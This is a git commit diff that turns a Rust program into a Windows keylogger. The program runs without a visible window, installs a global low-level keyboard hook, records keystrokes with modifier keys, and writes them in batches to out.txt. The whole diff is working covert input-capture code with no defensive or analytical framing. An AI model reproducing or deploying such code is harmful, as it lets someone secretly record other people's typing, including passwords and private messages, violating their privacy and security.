2c0060ef2f5c4f4fe93394bfc2ae9be7d75edece
Eveheeero <xhve00000@naver.com>
2022-12-23 08:26:44 +0000

    +

---
+++ Jobs/hook/src/buffer/mod.rs
@@ -0,0 +1,67 @@
+use std::{collections::LinkedList, io::Write, path::PathBuf, thread::sleep, time::Duration};
+
+pub(crate) static mut BUF: LinkedList<Input> = LinkedList::new();
+pub(crate) static mut OUTPATH: Option<PathBuf> = None;
+
+pub(crate) enum Input {
+    Keyboard {
+        keycord: u32,
+        alt: bool,
+        ctrl: bool,
+        shift: bool,
+    },
+    Mouse {
+        position: (u32, u32),
+    },
+    Enter,
+    Backspace,
+    Space,
+}
+
+#[must_use]
+pub(crate) unsafe fn write_to_file() -> ! {
+    // std::fs::remove_file(OUTPATH.as_ref().unwrap()).ok();
+    let mut file = std::fs::File::create(OUTPATH.as_ref().unwrap()).unwrap();
+    loop {
+        if BUF.len() < 100 {
+            sleep(Duration::from_secs(10));
+            continue;
+        }
+        let mut buf = String::new();
+        for _ in 0..100 {
+            let input = BUF.pop_front().unwrap();
+            match input {
+                Input::Keyboard {
+                    keycord,
+                    alt,
+                    ctrl,
+                    shift,
+                } => {
+                    if !alt && !ctrl && !shift {
+                        buf.push_str(&format!("{}", keycord as u8 as char));
+                    } else {
+                        buf.push_str("<");
+                        if alt {
+                            buf.push_str("A");
+                        }
+                        if ctrl {
+                            buf.push_str("C");
+                        }
+                        if shift {
+                            buf.push_str("S");
+                        }
+                        buf.push_str(&format!("-{}>", keycord as u8 as char));
+                    }
+                }
+                Input::Enter => buf.push_str("\n"),
+                Input::Mouse { position } => {
+                    buf.push_str(&format!("\n[[CLICK: {}, {}]]\n", position.0, position.1))
+                }
+                Input::Backspace => buf.push_str("<B>"),
+                Input::Space => buf.push_str(" "),
+            }
+        }
+        file.write_all(buf.as_bytes()).unwrap();
+        file.flush().unwrap();
+    }
+}
--- Jobs/hook/src/windows.rs
+++ Jobs/hook/src/windows.rs
@@ -1,6 +1,6 @@
 #![windows_subsystem = "windows"]
 
-use std::{cell::RefCell, io::Write};
+mod buffer;
 
 use windows::Win32::{
     Foundation::{BOOL, HINSTANCE, HWND, LPARAM, LRESULT, WPARAM},
@@ -8,89 +8,78 @@ use windows::Win32::{
         Input::KeyboardAndMouse::GetAsyncKeyState,
         WindowsAndMessaging::{
             CallNextHookEx, DispatchMessageA, GetMessageA, SetWindowsHookExW, TranslateMessage,
-            UnhookWindowsHookEx, HC_ACTION, HOOKPROC, MSG, WH_KEYBOARD_LL,
+            UnhookWindowsHookEx, HC_ACTION, HOOKPROC, KBDLLHOOKSTRUCT, MSG, WH_KEYBOARD_LL,
         },
     },
 };
 
-static mut DATA: Option<RefCell<std::fs::File>> = None;
-static mut BUF: String = String::new();
-static mut GO: bool = true;
+unsafe extern "system" fn callback_keyboard(code: i32, wparam: WPARAM, lparam: LPARAM) -> LRESULT {
+    'brace: {
+        if code == HC_ACTION.try_into().unwrap() {
+            // 키보드를 눌렀을 때의 입력이면
 
-unsafe extern "system" fn callback(code: i32, wparam: WPARAM, laparam: LPARAM) -> LRESULT {
-    if code == HC_ACTION.try_into().unwrap() {
-        for now in (0x20..=0x20)
-            .chain(0x0D..=0x0D)
-            .chain(0x30..0x39)
-            .chain(0x41..0x5A)
-        {
-            let space_status = GetAsyncKeyState(now);
-            if space_status.leading_zeros() == 0 {
-                // 0x8000
-                let msg = match now {
-                    0x20 => String::from("Space"),
-                    0x0D => String::from("Enter"),
-                    0x30..=0x39 => format!("{}", now - 0x30),
-                    0x41..=0x5A => format!("{}", (now - 0x41 + 0x61) as u8 as char),
-                    _ => break,
-                };
-
-                let plus = match now {
-                    0x41 => String::from("ㅁ"),
-                    0x42 => String::from("ㅠ"),
-                    0x43 => String::from("ㅊ"),
-                    0x44 => String::from("ㅇ"),
-                    0x45 => String::from("ㄷ"),
-                    0x46 => String::from("ㄹ"),
-                    0x47 => String::from("ㅎ"),
-                    0x48 => String::from("ㅗ"),
-                    0x49 => String::from("ㅑ"),
-                    0x4a => String::from("ㅓ"),
-                    0x4b => String::from("ㅏ"),
-                    0x4c => String::from("ㅣ"),
-                    0x4d => String::from("ㅡ"),
-                    0x4e => String::from("ㅜ"),
-                    0x4f => String::from("ㅐ"),
-                    0x50 => String::from("ㅔ"),
-                    0x51 => String::from("ㅂ"),
-                    0x52 => String::from("ㄱ"),
-                    0x53 => String::from("ㄴ"),
-                    0x54 => String::from("ㅅ"),
-                    0x55 => String::from("ㅕ"),
-                    0x56 => String::from("ㅍ"),
-                    0x57 => String::from("ㅈ"),
-                    0x58 => String::from("ㅌ"),
-                    0x59 => String::from("ㅛ"),
-                    0x5a => String::from("ㅋ"),
-                    _ => String::new(),
-                };
-
-                BUF.push_str(msg.as_str());
-                BUF.push_str(plus.as_str());
-                BUF.push('\n');
-                if BUF.len() > 100 {
-                    let mut file = DATA.as_ref().unwrap().borrow_mut();
-                    file.write_all(BUF.as_bytes()).unwrap();
-                    file.flush().unwrap();
-                    BUF.clear();
-                }
-                break;
+            /* 키보드 입력 타입으로 변환 */
+            let data = std::mem::transmute::<_, &KBDLLHOOKSTRUCT>(lparam);
+            // 가상 키코드 (https://learn.microsoft.com/en-us/windows/win32/inputdev/virtual-key-codes)
+            let keycode = data.vkCode;
+            // 엔커나 0~9 A~Z가 아니면 종료
+            if keycode == 0x08
+                || keycode == 0x0D
+                || keycode == 0x20
+                || (0x30 <= keycode && keycode <= 0x5A)
+            {
+            } else {
+                break 'brace;
             }
+
+            // 키보드를 방금 누른상태, 즉 이전에 안눌려있었으며 지금 눌려있는 상태면 진행, 아니면 종료 (0x8000)
+            // 앞의 1비트가 현재 눌려있는지, 뒤의 1비트가 이전에 눌려있었는지. (1이 true)
+            let keystate = GetAsyncKeyState(keycode.try_into().unwrap());
+            if keystate.leading_zeros() == 0 && keystate.trailing_ones() == 0 {
+            } else {
+                break 'brace;
+            }
+
+            // 키보드 파싱
+            let log: buffer::Input;
+
+            if keycode == 0x08 {
+                log = buffer::Input::Backspace;
+            } else if keycode == 0x0D {
+                log = buffer::Input::Enter;
+            } else if keycode == 0x20 {
+                log = buffer::Input::Space;
+            } else {
+                let alt = GetAsyncKeyState(0x12).leading_zeros() == 0;
+                let ctrl = GetAsyncKeyState(0x11).leading_zeros() == 0;
+                let shift = GetAsyncKeyState(0x10).leading_zeros() == 0;
+                log = buffer::Input::Keyboard {
+                    keycord: keycode,
+                    alt,
+                    ctrl,
+                    shift,
+                };
+            }
+
+            buffer::BUF.push_back(log);
         }
     }
-    CallNextHookEx(None, code, wparam, laparam)
+
+    CallNextHookEx(None, code, wparam, lparam)
 }
 
-const CALLBACK: HOOKPROC = Some(callback);
+const CALLBACK_KEYBOARD: HOOKPROC = Some(callback_keyboard);
 
 fn main() -> Result<(), Box<dyn std::error::Error>> {
     let handle;
     unsafe {
-        handle = SetWindowsHookExW(WH_KEYBOARD_LL, CALLBACK, HINSTANCE::default(), 0)?;
-        DATA = Some(RefCell::new(std::fs::File::create("log.txt")?));
+        buffer::OUTPATH = Some(std::env::current_dir()?.join("out.txt"));
+        let _ = std::thread::spawn(|| buffer::write_to_file());
+
+        handle = SetWindowsHookExW(WH_KEYBOARD_LL, CALLBACK_KEYBOARD, HINSTANCE::default(), 0)?;
 
         let mut msg = MSG::default();
-        while GO && GetMessageA(&mut msg, HWND(0), 0, 0) == BOOL(1) {
+        while GetMessageA(&mut msg, HWND(0), 0, 0) == BOOL(1) {
             TranslateMessage(&msg);
             DispatchMessageA(&msg);
         }
